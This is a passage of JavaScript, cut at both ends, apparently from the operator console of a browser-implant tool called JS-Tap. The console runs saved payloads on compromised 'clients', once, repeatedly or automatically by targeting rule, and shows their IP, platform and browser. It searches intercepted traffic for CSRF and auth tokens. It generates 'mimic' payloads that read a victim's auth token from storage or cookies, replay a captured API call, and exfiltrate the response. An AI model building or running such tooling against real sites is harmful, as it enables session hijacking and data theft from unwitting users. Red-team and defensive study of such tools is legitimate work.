		var executePayloadButton         = document.createElement('button');
		executePayloadButton.id          = id;
		executePayloadButton.className   = 'btn btn-sm me-2';
		executePayloadButton.textContent = 'Run';
		executePayloadButton.setAttribute('data-toggle', 'tooltip');
		executePayloadButton.setAttribute('title', 'Run Payload on All Clients Once');


		executePayloadButton.addEventListener('click', function()
		{
			// Run on all clients
			runPayloadAllClient(this);
		})

		var repeatPayloadToggle         = document.createElement('button');
		repeatPayloadToggle.id          = id;
		repeatPayloadToggle.className   = 'btn btn-sm me-2';
		repeatPayloadToggle.textContent = 'Repeat';
		repeatPayloadToggle.name        = name;

		repeatPayloadToggle.setAttribute('data-toggle', 'tooltip');
		repeatPayloadToggle.setAttribute('title', 'Repeatedly rerun Payload on All Clients');


		repeatPayloadToggle.addEventListener('click', function()
		{
			// Run on all clients
			repeatPayloadAllClients(this);
		})


		// If it was already toggled on in the database, make sure we reflect that here
		if (repeatrun)
		{
			repeatPayloadToggle.classList.add('active');
			repeatPayloadToggle.style.borderWidth = '2px';
			repeatPayloadToggle.style.borderColor = 'green';
		}

		var matchButton         = document.createElement('button');
		matchButton.className   = 'btn btn-sm me-2';
		matchButton.textContent = 'Add Rule';
		matchButton.setAttribute('data-toggle', 'tooltip');
		matchButton.setAttribute('title', 'Add a targeting rule for this payload');
		matchButton.addEventListener('click', (function(pid) {
			return function(e) {
				e.stopPropagation();
				showTargetRuleModal(pid);
			};
		})(id));

		var deletePayloadButton         = document.createElement('button');
		deletePayloadButton.id          = id;
		deletePayloadButton.className   = 'btn btn-sm';
		deletePayloadButton.textContent = 'Delete';
		deletePayloadButton.setAttribute('data-toggle', 'tooltip');
		deletePayloadButton.setAttribute('title', 'Delete This Payload');

		deletePayloadButton.addEventListener('click', function()
		{
			// delete from database
			deletePayload(event, this);
			event.stopPropagation();
			event.preventDefault();
		})

		var spacer = document.createElement('div');
		spacer.className = 'flex-grow-1';

		payload.appendChild(spacer);
		payload.appendChild(autorunToggle);
		payload.appendChild(repeatPayloadToggle);
		payload.appendChild(executePayloadButton);
		payload.appendChild(matchButton);
		payload.appendChild(deletePayloadButton);
		savedPayloadsList.appendChild(payload);

		// Render nested target rules for this payload
		var rules = allRules[i];
		if (rules.length > 0)
		{
			// "Matching Rules" divider label — standalone, aligned with rule left border
			var dividerLi = document.createElement('li');
			dividerLi.className = 'list-group-item py-0 px-2';
			dividerLi.style.marginLeft = '25px';
			dividerLi.style.fontSize = '0.7em';
			dividerLi.style.background = 'none';
			dividerLi.style.border = 'none';
			dividerLi.style.borderLeft = '3px solid #6c757d';
			dividerLi.style.borderRadius = '0';
			dividerLi.style.paddingTop = '6px';
			dividerLi.style.paddingBottom = '4px';
			dividerLi.textContent = 'Matching Rules';
			savedPayloadsList.appendChild(dividerLi);
		}
		for (var r = 0; r < rules.length; r++)
		{
			var rule = rules[r];
			var ruleLi = document.createElement('li');
			ruleLi.className = 'list-group-item d-flex justify-content-between align-items-center py-1 px-2';
			ruleLi.setAttribute('data-rule-id', rule.id);
			ruleLi.style.marginLeft = '25px';
			ruleLi.style.fontSize = '0.85em';
			ruleLi.style.borderLeft = '3px solid #6c757d';

			var querySpan = document.createElement('span');
			querySpan.style.fontFamily = 'monospace';
			querySpan.style.fontWeight = 'bold';
			querySpan.style.overflow = 'hidden';
			querySpan.style.textOverflow = 'ellipsis';
			querySpan.style.whiteSpace = 'nowrap';
			querySpan.style.maxWidth = '180px';
			querySpan.title = rule.filterQuery;
			querySpan.textContent = rule.filterQuery;

			var ruleBtnGroup = document.createElement('div');
			ruleBtnGroup.className = 'd-flex gap-1';

			// Autorun toggle
			var autorunBtn = document.createElement('button');
			autorunBtn.className = 'btn btn-sm me-2';
			autorunBtn.textContent = 'Autorun';
			autorunBtn.setAttribute('data-toggle', 'tooltip');
			autorunBtn.setAttribute('title', 'Automatically Run on Matching New Clients Once');
			if (rule.active)
			{
				autorunBtn.classList.add('active');
				autorunBtn.style.borderWidth = '2px';
				autorunBtn.style.borderColor = 'green';
			}
			autorunBtn.addEventListener('click', (function(ruleId) {
				return function(e) {
					e.stopPropagation();
					fetch('/api/payload/targetRule/' + ruleId + '/toggle', {method: 'POST'})
					.then(function() { refreshSavedPayloadList(); });
				};
			})(rule.id));

			// Repeat toggle
			var ruleRepeatBtn = document.createElement('button');
			ruleRepeatBtn.className = 'btn btn-sm me-2';
			ruleRepeatBtn.textContent = 'Repeat';
			ruleRepeatBtn.setAttribute('data-toggle', 'tooltip');
			ruleRepeatBtn.setAttribute('title', 'Repeatedly Rerun on Matching Clients');
			if (rule.repeatrun)
			{
				ruleRepeatBtn.classList.add('active');
				ruleRepeatBtn.style.borderWidth = '2px';
				ruleRepeatBtn.style.borderColor = 'green';
			}
			ruleRepeatBtn.addEventListener('click', (function(ruleId) {
				return function(e) {
					e.stopPropagation();
					fetch('/api/payload/targetRule/' + ruleId + '/repeat', {method: 'POST'})
					.then(function() { refreshSavedPayloadList(); });
				};
			})(rule.id));

			// Run button
			var ruleRunBtn = document.createElement('button');
			ruleRunBtn.className = 'btn btn-sm me-2';
			ruleRunBtn.textContent = 'Run';
			ruleRunBtn.setAttribute('data-toggle', 'tooltip');
			ruleRunBtn.setAttribute('title', 'Run Payload on All Matching Clients Once');
			ruleRunBtn.addEventListener('click', (function(ruleId) {
				return function(e) {
					e.stopPropagation();
					fetch('/api/payload/targetRule/' + ruleId + '/run', {method: 'POST'})
					.then(function(r) { return r.json(); })
					.then(function(data) {
						showToast('Ran on ' + data.matched + ' matching client(s)');
					});
				};
			})(rule.id));

			// Edit button
			var ruleEditBtn = document.createElement('button');
			ruleEditBtn.className = 'btn btn-sm me-2';
			ruleEditBtn.textContent = 'Edit';
			ruleEditBtn.setAttribute('data-toggle', 'tooltip');
			ruleEditBtn.setAttribute('title', 'Edit This Target Rule');
			ruleEditBtn.addEventListener('click', (function(ruleId, ruleQuery, pid) {
				return function(e) {
					e.stopPropagation();
					showTargetRuleModal(pid, ruleId, ruleQuery);
				};
			})(rule.id, rule.filterQuery, id));

			// Delete button
			var ruleDeleteBtn = document.createElement('button');
			ruleDeleteBtn.className = 'btn btn-sm';
			ruleDeleteBtn.textContent = 'Delete';
			ruleDeleteBtn.setAttribute('data-toggle', 'tooltip');
			ruleDeleteBtn.setAttribute('title', 'Delete This Target Rule');
			ruleDeleteBtn.addEventListener('click', (function(ruleId) {
				return function(e) {
					e.stopPropagation();
					fetch('/api/payload/targetRule/' + ruleId, {method: 'DELETE'})
					.then(function() { refreshSavedPayloadList(); });
				};
			})(rule.id));

			ruleBtnGroup.appendChild(autorunBtn);
			ruleBtnGroup.appendChild(ruleRepeatBtn);
			ruleBtnGroup.appendChild(ruleRunBtn);
			ruleBtnGroup.appendChild(ruleEditBtn);
			ruleBtnGroup.appendChild(ruleDeleteBtn);

			ruleLi.appendChild(querySpan);
			ruleLi.appendChild(ruleBtnGroup);
			savedPayloadsList.appendChild(ruleLi);
		}
	}
}


function showTargetRuleModal(payloadId, editRuleId, existingQuery)
{
	var modalEl = document.getElementById('targetRuleModal');
	var modalTitle = modalEl.querySelector('.modal-title');
	var filterInput = document.getElementById('targetRuleFilterInput');
	var previewBtn = document.getElementById('targetRulePreviewBtn');
	var previewResults = document.getElementById('targetRulePreviewResults');
	var previewCount = document.getElementById('targetRulePreviewCount');
	var previewList = document.getElementById('targetRulePreviewList');
	var saveBtn = document.getElementById('targetRuleSaveBtn');

	// Set title and pre-fill for edit vs add
	var isEdit = !!editRuleId;
	modalTitle.textContent = isEdit ? 'Edit Target Rule' : 'Add Target Rule';
	filterInput.value = isEdit ? existingQuery : '';
	saveBtn.textContent = isEdit ? 'Update Rule' : 'Save Rule';
	previewResults.style.display = 'none';
	previewCount.textContent = '0';
	previewList.innerHTML = '';

	var modal = new bootstrap.Modal(modalEl);

	// Clone buttons to remove old listeners
	var newPreviewBtn = previewBtn.cloneNode(true);
	previewBtn.parentNode.replaceChild(newPreviewBtn, previewBtn);

	var newSaveBtn = saveBtn.cloneNode(true);
	saveBtn.parentNode.replaceChild(newSaveBtn, saveBtn);

	// Wire Preview button
	newPreviewBtn.addEventListener('click', function() {
		var query = filterInput.value.trim();
		if (!query)
		{
			showToast('Enter a filter query', 'warning');
			return;
		}
		fetch('/api/payload/targetRule/preview', {
			method: 'POST',
			body: JSON.stringify({filterQuery: query}),
			headers: {'Content-type': 'application/json; charset=UTF-8'}
		})
		.then(function(r) { return r.json(); })
		.then(function(data) {
			previewResults.style.display = 'block';
			previewCount.textContent = data.matched;
			previewList.innerHTML = '';
			for (var i = 0; i < data.clients.length; i++)
			{
				var c = data.clients[i];
				var card = document.createElement('div');
				card.className = 'card mb-1';

				var cardBody = document.createElement('div');
				cardBody.className = 'card-body';
				cardBody.style.padding = '0.35rem 0.5rem';

				// Title: tag/nickname
				var title = document.createElement('h6');
				title.className = 'card-title mb-0';
				title.style.fontSize = '0.85em';
				var clientName = c.tag ? escapeHTML(c.tag) + '/' + escapeHTML(c.nickname) : escapeHTML(c.nickname);
				title.innerHTML = '<u>' + clientName + '</u>';

				// Subtitle: timestamps + domain
				var subtitle = document.createElement('div');
				subtitle.className = 'card-subtitle mb-0 text-muted';
				subtitle.style.fontSize = '0.75em';
				subtitle.innerHTML = 'First Seen: ' + humanized_time_span(c.firstSeen) + '&nbsp;&nbsp;&nbsp;Last Seen: <b>' + humanized_time_span(c.lastSeen) + '</b>';
				if (c.domain)
				{
					subtitle.innerHTML += '<br>Domain: <b>' + escapeHTML(c.domain) + '</b>';
				}

				// Body: IP, platform, browser
				var details = document.createElement('div');
				details.style.fontSize = '0.75em';
				details.innerHTML = 'IP: <b>' + escapeHTML(c.ip) + '</b>';
				details.innerHTML += '<br>Platform: <b>' + escapeHTML(c.platform) + '</b>';
				details.innerHTML += '<br>Browser: <b>' + escapeHTML(c.browser) + '</b>';

				cardBody.appendChild(title);
				cardBody.appendChild(subtitle);
				cardBody.appendChild(details);
				card.appendChild(cardBody);
				previewList.appendChild(card);
			}
			if (data.clients.length === 0)
			{
				var emptyMsg = document.createElement('div');
				emptyMsg.className = 'text-muted p-2';
				emptyMsg.textContent = 'No matching clients';
				previewList.appendChild(emptyMsg);
			}
		});
	});

	// Wire Save button
	newSaveBtn.addEventListener('click', function() {
		var query = filterInput.value.trim();
		if (!query)
		{
			showToast('Enter a filter query', 'warning');
			return;
		}

		var url, successMsg;
		if (isEdit)
		{
			url = '/api/payload/targetRule/' + editRuleId + '/update';
			successMsg = 'Target rule updated';
		}
		else
		{
			url = '/api/payload/' + payloadId + '/targetRule';
			successMsg = 'Target rule added';
		}

		fetch(url, {
			method: 'POST',
			body: JSON.stringify({filterQuery: query}),
			headers: {'Content-type': 'application/json; charset=UTF-8'}
		})
		.then(function(response) {
			if (response.ok)
			{
				modal.hide();
				refreshSavedPayloadList();
				showToast(successMsg);
			}
		});
	});

	// Highlight the rule being edited in the payload list
	if (isEdit)
	{
		var allRuleItems = document.querySelectorAll('#savedPayloadsList li[data-rule-id]');
		for (var ri = 0; ri < allRuleItems.length; ri++)
		{
			if (allRuleItems[ri].getAttribute('data-rule-id') == editRuleId)
			{
				allRuleItems[ri].classList.add('table-active');
			}
		}
	}

	// Remove highlight when modal closes
	modalEl.addEventListener('hidden.bs.modal', function onHidden() {
		var highlighted = document.querySelectorAll('#savedPayloadsList li.table-active[data-rule-id]');
		for (var hi = 0; hi < highlighted.length; hi++)
		{
			highlighted[hi].classList.remove('table-active');
		}
		modalEl.removeEventListener('hidden.bs.modal', onHidden);
	});

	modal.show();
	setTimeout(function() { filterInput.focus(); }, 300);
}




function toggleCodeEditor()
{
	var codeDiv                 = document.getElementById('payload-editor');
	var editorCol               = document.getElementById('payloadEditor');
	var listCol                 = document.getElementById('savedPayloadsList');
	var listGroup               = document.getElementById('savedPayloadsGroup');
	var payloadNameGroup        = document.getElementById('payloadNameGroup');
	var payloadDescriptionGroup = document.getElementById('payloadDescriptionGroup');
	var toggleCodeButton        = document.getElementById('payload-code-button');

	    // Toggle the editor column to full width and back
	if (editorCol.classList.contains('col-md-12')) 
	{
		this.textContent = "Expand Code";
		editorCol.classList.remove('col-md-12');
		editorCol.classList.add('col-md-6');
		listCol.classList.remove('d-none');
		listGroup.style.display               = "block";
		payloadNameGroup.style.display        = "block";
		payloadDescriptionGroup.style.display = "block";
		codeEditor.setSize(null, "300px");
		codeEditor.refresh();
		codeEditorBig = false;
	}
	else
	{
		this.textContent = "Shrink Code";
		editorCol.classList.remove('col-md-6');
		editorCol.classList.add('col-md-12');
		listCol.classList.add('d-none');
		listGroup.style.display               = "none";
		payloadNameGroup.style.display        = "none";
		payloadDescriptionGroup.style.display = "none";
		codeEditor.setSize(null, "600px");
		codeEditor.refresh();
		codeEditorBig = true;
	}

	toggleCodeButton.blur();
}


async function showCustomPayloadModal(skipClear)
{
	console.log("showing custom payloads...");
	var modal = new bootstrap.Modal(document.getElementById('customPayloadModal'));

	var modalElement      = document.getElementById('customPayloadModal');
	var saveButton        = document.getElementById('payload-save-button');
	var importButton      = document.getElementById('payload-import-button');
	var exportButton      = document.getElementById('payload-export-button');
	var clearJobsButton   = document.getElementById('payload-clear-button');
	var closeButton       = document.getElementById('payload-close-button');
	var toggleCodeButton  = document.getElementById('payload-code-button');


	var payloadNameInput   = document.getElementById('payloadName');
	var payloadDescription = document.getElementById('payloadDescription');
	var payloadCode        = document.getElementById('payload-editor');

	var savedPayloadsList = document.getElementById('savedPayloadsList');

	initializeCodeMirror();

	if (codeEditorBig)
	{
		// Make sure we start with whole UI visible
		toggleCodeEditor();
	}

	if (!skipClear)
	{
		// console.log("-----CLEARING CODE");
		payloadNameInput.value   = "";
		payloadDescription.value = "";
		codeEditor.setValue("");
		codeEditor.refresh();
	}

	modalElement.addEventListener('shown.bs.modal', function ()
	{
		if (codeEditor) 
		{
			codeEditor.refresh();
		}
	});

	saveButton.disabled      = false;


	refreshSavedPayloadList();

	// Detect unsaved changes
	var unsavedChanges = false;

	payloadNameInput.addEventListener('input', function() 
	{
		unsavedChanges = true;
		//console.log("Name Unsaved changes!");
	});

	payloadDescription.addEventListener('input', function() 
	{
		unsavedChanges = true;
	//	console.log("Description Unsaved changes!");
	});


	codeEditor.on("change", function(cm, change) 
	{
		if (change.origin === "+input" || change.origin === "paste") 
		{
			unsavedChanges = true;
//	        console.log("Human-made change detected in Code Editor.");
		} 
	});


	closeButton.onclick = function(event) 
	{
		if (unsavedChanges)
		{
			showConfirmModal('Unsaved Changes', 'You have unsaved changes, close anyway?', function() {
				modal.hide();
			});
		}
		else
		{
			modal.hide();
		}
	}


	// Handle saving modified notes
	saveButton.onclick = function(event) 
	{
		console.log("Gotta save payload button..");
		if (payloadNameInput.value === "")
		{
			console.log("Oh no, failed to set a name!");
			event.preventDefault();
			payloadNameInput.classList.add('is-invalid');
		}
		else
		{
			payloadNameInput.classList.remove('is-invalid');
			console.log("Payload name is: " + payloadNameInput.value);


			unsavedChanges = false;

			// send payload to server
			fetch('/api/savePayload', {
				method:"POST",
				body: JSON.stringify({
					name: payloadNameInput.value,
					description: unicodeBtoa(payloadDescription.value),
					code: unicodeBtoa(codeEditor.getValue())
				}),
				headers: {
					"Content-type": "application/json; charset=UTF-8"
				}
			})
			.then(response => {
				if (!response.ok) {
					console.log('Save payload server failed.');
				}
				return response.text();
			})
			.then(text => {
				refreshSavedPayloadList();
			});	
		}
		saveButton.blur();
	}



	clearJobsButton.onclick = function(event)
	{
		showConfirmModal('Clear All Jobs', 'Do you want to clear all custom payload jobs from all clients and disable all auto/repeat run jobs?', function() {
			fetch('/api/clearAllPayloadJobs')
			.then(response => {
				refreshSavedPayloadList();
				showToast('All payload jobs cleared');
			});
		});
		clearJobsButton.blur();
	}



	toggleCodeButton.onclick = function(event)
	{
		toggleCodeEditor();
	}	

	var importInput = document.getElementById('importInput');
	importInput.removeEventListener('change', importPayloads);
	importInput.addEventListener('change', importPayloads, false);

	importButton.onclick = function(event) 
	{
		importInput.click();
	}


	exportButton.onclick = function(event)
	{
		console.log("Export button pressed");
		exportAllPayloads(this);
	}

	modal.show();
	codeEditor.refresh();
}





function updateClientSessions()
{
	var checkBox = document.getElementById('allowNewClientSessions');

	if (checkBox.checked == true)
	{
		fetch('/api/app/setAllowNewClientSessions/1').then(function() {
			showToast('New client sessions enabled');
		});
	}
	else
	{
		fetch('/api/app/setAllowNewClientSessions/0').then(function() {
			showToast('New client sessions disabled');
		});
	}
}


function showNoteEditor(event, client, nickname, notes)
{
	// console.log("STARTING SHOW NOTE EDITOR!!!!");
	var modal      = new bootstrap.Modal(document.getElementById("noteEditorModal"));
	var noteTitle  = document.getElementById('note-editor-title');
	var noteEditor = document.getElementById('note-editor');
	var saveButton = document.getElementById('note-save-button');


	// Handle saving modified notes
	saveButton.onclick = function(event) {
		console.log("Saving note for: " + client);
		var newNotes = noteEditor.value;

		console.log("New notes value:");
		console.log(newNotes);

		encodedNotes = unicodeBtoa(newNotes);

		// Send notes to server
		fetch('/api/updateClientNotes/' + client, {
			method:"POST",
			body: JSON.stringify({
				note: encodedNotes
			}),
			headers: {
				"Content-type": "application/json; charset=UTF-8"
			}
		}).then(function() {
			showToast('Notes saved');
		});

		modal.hide();
		updateClients();
	};


	noteTitle.innerHTML = '<u>' + escapeHTML(nickname) + '</u> notes:';
	noteEditor.value = unicodeAtob(notes);
	modal.show();


	// Block resetting of loot card stack
	event.stopPropagation();
}




async function showReqRespViewer(eventKey, type)
{
	if (type == "XHR")
	{
		xhrCallReq  = await fetch('/api/clientXhrCall/' + eventKey);
		xhrCallJson = await xhrCallReq.json();

		requestBody  = xhrCallJson.requestBody;
		responseBody = xhrCallJson.responseBody;
	}
	else if (type == "FETCH")
	{
		fetchCallReq  = await fetch('/api/clientFetchCall/' + eventKey);
		fetchCallJson = await fetchCallReq.json();

		requestBody  = fetchCallJson.requestBody;
		responseBody = fetchCallJson.responseBody;
	}
	else
	{
		console.log("Invalid type in showReqRespViewer");
	}

	prettyRequest  = window.js_beautify(unicodeAtob(requestBody), {indent_size: 2});
	prettyResponse = window.js_beautify(unicodeAtob(responseBody), {indent_size: 2});

	requestContent = document.getElementById("requestBox");
	requestContent.innerHTML = prettyRequest;

	responseContent = document.getElementById("responseBox");
	responseContent.innerHTML = prettyResponse;



	var modal = new bootstrap.Modal(document.getElementById('requestResponseModal'));
	modal.show();
}



async function searchCSRFToken(eventKey, tokenName, tokenValue)
{
	var searchDataDiv = document.getElementById('searchDataDiv');

	searchDataDiv.innerHTML = "";

	tokenSearchReq = await fetch('/api/formCsrfTokenSearch/' + eventKey, {
		method:"POST",
		body: JSON.stringify({
			tokenName: tokenName,
			tokenValue: tokenValue
		}),
		headers: {
			"Content-type": "application/json; charset=UTF-8"
		}
	});

	tokenSearchJson = await tokenSearchReq.json();

	var searchData = document.createElement('p');

	searchData.innerHTML  = '<b>CSRF Token URL:</b><br>' + escapeHTML(tokenSearchJson.url) + '<br><br>';
	searchData.innerHTML += '<b>CSRF Token file:</b><br>' + escapeHTML(tokenSearchJson.fileName) + '<br><br>';
	window._csrfTokenFileName = tokenSearchJson.fileName;
	searchData.innerHTML += '<button type="button" class="btn btn-primary" onclick="downloadHtmlCode(window._csrfTokenFileName)">Download Code</button><br><br>';
	searchData.innerHTML += '<b>Click "Next" to build payload</b>';
	tokenUrl = tokenSearchJson.url;
	searchDataDiv.appendChild(searchData);
}




async function searchAuthToken(eventKey, tokenValue, apiType)
{
	var searchDataDiv = document.getElementById('apiSearchDataDiv');

	searchDataDiv.innerHTML = "";


	tokenSearchReq = await fetch('/api/apiAuthTokenSearch/' + eventKey, {
		method:"POST",
		body: JSON.stringify({
			type:apiType,
			tokenValue: tokenValue
		}),
		headers: {
			"Content-type": "application/json; charset=UTF-8"
		}
	});

	tokenSearchJson = await tokenSearchReq.json();

	var searchData = document.createElement('p');

	if (tokenSearchJson.location === "NOT FOUND")
	{
		searchData.innerHTML  = '<b>Auth Token not found in cookies or local or session storage. </br><br><br>';
		searchData.innerHTML += '<b>Check API Call Body for authorization token. </br><br><br>';
	}
	else
	{
		searchData.innerHTML  = '<b>Auth Token Location:</b><br>' + escapeHTML(tokenSearchJson.location) + '<br><br>';
		searchData.innerHTML += '<b>Token Key:</b><br>' + escapeHTML(tokenSearchJson.tokenName) + '<br><br>';
		searchData.innerHTML += '<b>Click "Next" to build payload</b>';		
	}


	tokenLocation = tokenSearchJson.location;
	tokenKey      = tokenSearchJson.tokenName;
	searchDataDiv.appendChild(searchData);
}





function showMimicApiModalFromStore(eventKey) {
	var entry = _mimicData[eventKey];
	if (entry) showMimicApiModal(eventKey, JSON.stringify(entry.data), entry.type);
}

function showMimicFormModalFromStore(eventKey) {
	var entry = _mimicData[eventKey];
	if (entry) showMimicFormModal(eventKey, JSON.stringify(entry.data));
}

function toggleStarFromStore(imgObject, event, clientId) {
	var d = _clientData[clientId];
	toggleStar(imgObject, event, clientId, d ? d.nickname : '');
}

function blockClientFromStore(imgObject, event, clientId) {
	var d = _clientData[clientId];
	blockClient(imgObject, event, clientId, d ? d.nickname : '');
}

function showNoteEditorFromStore(event, clientId) {
	var d = _clientData[clientId];
	showNoteEditor(event, clientId, d ? d.nickname : '', d ? d.notes : '');
}


function showNicknameEditor(event, clientId) {
	event.stopPropagation();

	var card = document.getElementById('clientCard' + clientId);
	if (!card) return;

	var cardTitle = card.querySelector('.card-title');
	if (!cardTitle) return;

	// Already editing?
	if (cardTitle.querySelector('.nickname-edit-input')) return;

	var d = _clientData[clientId];
	var currentNickname = d ? d.nickname : '';

	// Save original content so we can restore on cancel
	var originalHTML = cardTitle.innerHTML;

	// Build inline editor
	var container = document.createElement('div');
	container.className = 'd-flex align-items-center gap-1 flex-wrap';

	var input = document.createElement('input');
	input.type = 'text';
	input.className = 'form-control form-control-sm nickname-edit-input';
	input.value = currentNickname;
	input.style.maxWidth = '200px';
	input.style.fontSize = '0.85em';
	input.maxLength = 60;

	var saveBtn = document.createElement('button');
	saveBtn.className = 'btn btn-primary btn-sm';
	saveBtn.textContent = 'Save';
	saveBtn.style.fontSize = '0.75em';

	var cancelBtn = document.createElement('button');
	cancelBtn.className = 'btn btn-secondary btn-sm';
	cancelBtn.textContent = 'Cancel';
	cancelBtn.style.fontSize = '0.75em';

	var errorSpan = document.createElement('span');
	errorSpan.className = 'text-danger';
	errorSpan.style.fontSize = '0.75em';
	errorSpan.style.display = 'none';

	container.appendChild(input);
	container.appendChild(saveBtn);
	container.appendChild(cancelBtn);
	container.appendChild(errorSpan);

	// Stop any click inside the editor from bubbling to the card's onclick
	// (which would re-select the client and rebuild the card, destroying the editor)
	container.onclick = function(e) { e.stopPropagation(); };

	cardTitle.innerHTML = '';
	cardTitle.appendChild(container);

	input.focus();
	input.select();

	cancelBtn.onclick = function(e) {
		e.stopPropagation();
		cardTitle.innerHTML = originalHTML;
	};

	input.addEventListener('keydown', function(e) {
		if (e.key === 'Escape') {
			e.stopPropagation();
			cardTitle.innerHTML = originalHTML;
		} else if (e.key === 'Enter') {
			e.stopPropagation();
			saveBtn.click();
		}
	});

	saveBtn.onclick = function(e) {
		e.stopPropagation();
		var newNickname = input.value.trim();

		if (!newNickname) {
			errorSpan.textContent = 'Cannot be empty';
			errorSpan.style.display = '';
			return;
		}

		if (newNickname === currentNickname) {
			cardTitle.innerHTML = originalHTML;
			return;
		}

		saveBtn.disabled = true;
		errorSpan.style.display = 'none';

		fetch('/api/updateClientNickname/' + clientId, {
			method: 'POST',
			body: JSON.stringify({ nickname: newNickname }),
			headers: { 'Content-type': 'application/json; charset=UTF-8' }
		}).then(function(resp) {
			return resp.json().then(function(data) {
				if (!resp.ok) {
					errorSpan.textContent = data.error || 'Failed to save';
					errorSpan.style.display = '';
					saveBtn.disabled = false;
				} else {
					// Update local store
					if (_clientData[clientId]) {
						_clientData[clientId].nickname = newNickname;
					}
					// Remove editor from DOM before refreshing so updateClients guard doesn't block
					container.remove();
					showToast('Nickname updated');
					updateClients();
				}
			});
		}).catch(function() {
			errorSpan.textContent = 'Network error';
			errorSpan.style.display = '';
			saveBtn.disabled = false;
		});
	};
}


async function showMimicApiModal(eventKey, apiCallDataString, apiType)
{
	initializeCodeMirror();
	console.log("Showing mimic api call modal with key: " + eventKey);

	var searchButton  = document.getElementById("mimic-api-search-button");
	var nextButton    = document.getElementById("mimic-api-next-button");
	var tokenName     = document.getElementById("apiTokenNameInput");
	var tokenValue    = document.getElementById("apiTokenValueInput");

	tokenName.value  = "";
	tokenValue.value = "";

	var tokenSearch = false;

	var apiCallData = JSON.parse(apiCallDataString);

	console.log(apiCallData);

	var apiURL    = escapeHTML(apiCallData.url);
	var apiMethod = escapeHTML(apiCallData.method);
	var apiSync   = true;
	var name      = "";
	var password  = "";

	if (apiType === "XHR")
	{
		apiAsync = escapeHTML(apiCallData.asyncRequest);
		name     = escapeHTML(apiCallData.name);
		passwrod = escapeHTML(apiCallData.password);
	}

	var apiDataDiv    = document.getElementById('apiDataDiv');
	var searchDataDiv = document.getElementById('apiSearchDataDiv');

	apiDataDiv.innerHTML = "";

	var data = document.createElement('p');
	data.innerHTML  = 'API Type: <b>' + apiType + '</b><br>';
	data.innerHTML += 'URL: <b>' + apiURL + '</b><br>';
	data.innerHTML += 'Method: <b>' + apiMethod + '</b><br>';
	data.innerHTML += '<br>';
	data.innerHTML += 'Headers:<br>';


	// headers...
	apiCallData.headers.forEach(header => {
		data.innerHTML += "<b>" + escapeHTML(header.header) + ":" + escapeHTML(header.value) + "</b>";
		data.innerHTML += "<br>";
	});

	// Show body option?

    // Append the paragraph to the dynamic div
	apiDataDiv.appendChild(data);

	searchDataDiv.innerHTML = "";


	// Need to get the request body
	if (apiType == "XHR")
	{
		xhrCallReq  = await fetch('/api/clientXhrCall/' + eventKey);
		xhrCallJson = await xhrCallReq.json();

		requestBody  = xhrCallJson.requestBody;
		responseBody = xhrCallJson.responseBody;
	}
	else if (apiType == "FETCH")
	{
		fetchCallReq  = await fetch('/api/clientFetchCall/' + eventKey);
		fetchCallJson = await fetchCallReq.json();

		requestBody  = fetchCallJson.requestBody;
		responseBody = fetchCallJson.responseBody;
	}
	else
	{
		console.log("Invalid api type in showMimicApiModal()");
	}

	console.log("In mimic API, request body is: " + unicodeAtob(requestBody));



	searchButton.onclick = function(event) 
	{
		var canSearch = true;

		if (tokenName.value.trim() === "")
		{
			tokenName.classList.add('is-invalid');
			canSearch = false;
		}
		else
		{
			tokenName.classList.remove('is-invalid');
		}

		if (tokenValue.value.trim() === "")
		{
			tokenValue.classList.add('is-invalid');
			canSearch = false;
		}
		else
		{
			tokenValue.classList.remove('is-invalid');
		}

		if (canSearch)
		{
			searchAuthToken(eventKey, tokenValue.value.trim(), apiType)
			tokenSearch = true;
		}

		searchButton.blur();
	}


    // Generate a mimic payload
	nextButton.onclick = function(event)
	{
    	// Let's generate that payload
		var payload = "";

		payload += "// JS-Tap mimic generated API call payload\n";
		payload += "// Payload variables below with intercepted values. Modify as you see fit.\n";
		payload += "// ----------------------------------------------------------------------.\n";


		//  I need to body from the API call here...
		requestBodyJson = JSON.parse(unicodeAtob(requestBody));

		for (let key in requestBodyJson)
		{
			if (requestBodyJson.hasOwnProperty(key))
			{
				console.log("key: " + key + ", value: " + requestBodyJson[key]);
				payload += `var var_${key} = '${requestBodyJson[key]}';\n`;
			}
		}

		payload += "// ----------------------------------------------------------------------.\n";

		switch(tokenLocation)
		{
		case 'Local Storage':
			{
				payload += `var foundAuthToken = localStorage.getItem('${tokenKey}');\n`;
			}
			break;

		case 'Session Storage':
			{
				payload += `var foundAuthToken = sessionStorage.getItem('${tokenKey}');\n`;
			}
			break;

		case 'Cookies':
			{
				payload += `var foundAuthToken = getCookie('${tokenKey}');\n`;
			}
			break;

		default:
			if (tokenSearch)
			{
				// Only matters if we're trying to search for a token
				showToast('Authentication token not found.', 'warning');
			}
		}


		payload += "var bodyData = {\n";

		for (let key in requestBodyJson)
		{
			if (requestBodyJson.hasOwnProperty(key)) 
	  		{  // Check if the key is not from the prototype chain
	  			var variableName = key.replace(/-/g, '_');
	  			payload += `	"${key}": var_${variableName},\n`;
	  		}		
	  	}
	  	payload += "};\n";


	  	payload += `fetch('${apiURL}', {\n`;
	  	payload += `	method: '${apiMethod}',\n`;
	  	payload += `	credentials: 'same-origin',\n`;
	  	payload += '    headers: {\n';

		// Pull the headers in:
	  	for (let key in apiCallData.headers) 
	  	{
	  		if (apiCallData.headers.hasOwnProperty(key)) 
	  		{
		        var headerInfo = apiCallData.headers[key]; // Assuming this is already an object with 'header' and 'value'

		        var headerName  = headerInfo.header;
		        var headerValue = headerInfo.value;

		        console.log('$$$$$ Header Info: ', headerInfo);
		        console.log('## Name: ' + headerName + ', Value: ' + headerValue);

		        // Check if the key is the auth token
		        if (headerName === tokenName.value.trim()) 
		        {
		            // this is our dynamic token
		        	console.log('&& found auth header!');

		            // Need to check if it uses the Bearer format
		        	if (headerValue.includes('Bearer'))
		        	{
		        		payload += `        '${headerName}': 'Bearer ' + foundAuthToken,\n`;

		        	}
		        	else
		        	{		          
		        		payload += `        '${headerName}': foundAuthToken,\n`;
		        	}
		        } 
		        else 
		        {
		        	console.log('** handling non-auth header...');
		        	payload += `        '${headerName}': '${headerValue}',\n`;
		        }
		    }
		}
		payload += '    },\n';

		payload += '	body: JSON.stringify(bodyData)\n';

		payload += "})\n";
		payload += ".then(response => {\n";
		payload += "	var statusCode = response.status;\n";
		payload += "	return response.text().then(responseBody => {\n";
		payload += "		customExfil('Payload Response, Status code: ' + statusCode, 'Response Body:' + responseBody);\n";
		payload += "	});\n";
		payload += "})\n";
		payload += ".catch(error => {\n";
		payload += "	customExfil('Error', 'Caught error in mimic payload');\n";
		payload += "})\n";


		nextButton.blur();
